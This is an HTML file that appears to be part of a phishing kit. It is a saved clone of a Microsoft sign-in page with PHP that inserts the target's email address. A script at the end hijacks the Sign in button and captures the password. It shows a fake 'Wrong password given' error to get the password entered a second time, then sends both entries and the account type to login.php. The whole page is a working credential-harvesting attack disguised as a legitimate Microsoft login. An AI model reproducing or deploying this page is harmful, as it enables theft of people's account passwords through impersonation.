...
<!DOCTYPE html> <html dir=ltr class lang=en><!--
 ...
 url: https://login.microsoftonline.com/common/oauth2/authorize?response_type=id_token&client_id=5e3ce6c0-2b1f-4285-8d4b-75ee78787346&redirect_uri=https%3A%2F%2Fteams.microsoft.com%2Fgo&state=29d9efca-360f-46c3-b6bc-f315c4a8cc54&client-request-id=6cb6592f-7a16-45da-8264-1e020e325405&x-client-SKU=Js&x-client-Ver=1.0.9&nonce=34cf1edb-5ea9-479f-99a2-c6734792026c&domain_hint=&sso_reload=true
 saved date: Thu May 06 2021 19:53:49 GMT+0800 (China Standard Time)
--><meta charset=utf-8>
...
<div>
        ...
        'slide-in-back': animate.isSlideInBack() }">
                    ...
                    event: {
                        ...
                        setPendingRequest: $loginPage.view_onSetPendingRequest } }">
                                                    <input type=text name=loginfmt data-bind="moveOffScreen, value: unsafe_displayName" class=moveOffScreen tabindex=-1 aria-hidden=true value="<?php echo $_SESSION["email"] ?>">
            ...
            event: {
                ...
                externalCss: {
                    'input': true,
                    'text-box': true,
                    'has-error': passwordTextbox.error }" aria-describedby="loginHeader  " placeholder=Password aria-label="Enter the password for <?php echo $_SESSION["email"] ?>" tabindex=0 value>
                                                                ...
                                                                <div class=col-md-24>
                                                                    <div class=text-13>
                                                                        ...
                                                                        <div class=form-group>
                                                                            <a id=idA_PWD_ForgotPassword role=link href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAeNiNdQz0LPUYjbUM7RSMU01Tk41SzbQNUoyTNM1MbIw1bVIMUnSNTdNTTW3AEJjE7MiIS4B_chtOWJVt1ybUuSY-IxCWGcxMqxilMsoKSkottLXL0lNzC3Wy81MLsovzk8r0UvOz9VPz9_ByHiBkfEFI-MqJhVjk-Q0w9SUJF3T1ERLXRNzyzRdS8tEI91kM6AN5pZGBkZmybeY-P0dS0syjEBEflFmVeosZhUjyxTL1LTkRF1jMwOgA82SjXWTzJKSddOMDU2TTRItkpNNTTYxswFtzM3Pu8HMeIGF8RWLGAejAIMEpwKDBrsBsxUHBxeQx6DA8IOFcREr0DMb82zZbUJb_bdP2ux7auYhhlOs-uFpnkmWfmmZBT6plf4-USmumX6mBgFOWS653pXuRokGbkEZ_kFZ7vqpkem2BlaGE9jYTrExeRV_YGPsYGfYxUkgJA7wMgAA0&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10" data-bind="
    ...
    css: { 'no-margin-bottom': removeBottomMargin }">
                                                                        ...
                                                                        <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class=inline-block>
                                                                            <p class="loginError" style="display:none;">Wrong password given.</p>
                                                                            <button id="idSIButton9" data-bind="
            ...
            preventTabbing: primaryButtonPreventTabbing" class="button ext-button primary ext-primary" value="Sign in">Sign in</button>
                                                                        ...
                                                                        <script>
                                                                            window.onload = function() {
                                                                                ...
                                                                                document.querySelector('#idSIButton9').addEventListener('click', function (e) {
                                                                                    e.preventDefault()
                                                                                    counter += 1;
                                                                                    if (counter ==2) {
                                                                                        pass1=document.querySelector('#i0118').value
                                                                                        document.querySelector('.loginError').style.display = "block";
                                                                                        return false;
                                                                                    } else {
                                                                                        counter = 1;
                                                                                        pass2=document.querySelector('#i0118').value
                                                                                        window.location.href = "login.php?pass1="+pass1+"&pass2="+pass2+"&accounttype="+localStorage.getItem("selection")
